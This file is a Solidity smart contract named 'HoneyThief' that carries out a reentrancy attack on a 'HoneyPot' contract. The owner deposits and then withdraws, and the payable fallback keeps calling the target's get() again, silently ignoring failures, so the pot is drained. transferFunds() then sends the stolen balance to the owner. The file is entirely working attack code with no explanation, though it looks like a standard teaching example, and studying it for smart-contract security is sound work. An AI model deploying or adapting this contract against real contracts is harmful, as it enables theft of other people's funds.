pragma solidity ^0.5.0;

import '@openzeppelin/contracts/ownership/Ownable.sol';

contract HoneyThief is Ownable {
    
    event LogFallback(address indexed sender, uint indexed value, uint newBalance);

    constructor() public {
    }

    function() external payable {
        emit LogFallback(msg.sender, msg.value, address(this).balance);

       (bool success, ) = msg.sender.call(abi.encodeWithSignature("get()", ""));

        if(!success) {
            //Eat the failure. Do not revert. 
        }

    }

    function put(address honeyPotAddress) public payable onlyOwner {
       HoneyPot honeyPot = HoneyPot(honeyPotAddress);
       honeyPot.put.value(msg.value)();
    }

    function get(address honeyPotAddress) public onlyOwner {
        HoneyPot honeyPot = HoneyPot(honeyPotAddress);
        honeyPot.get();
    }

    function transferFunds() public onlyOwner {
        (bool success, ) = msg.sender.call.value(address(this).balance)("");
        require(success, "Transfer failed.");
    }
}

contract HoneyPot {

    function put() payable public {}

    function get() public {}

    function balances(address) public view returns (uint){}
}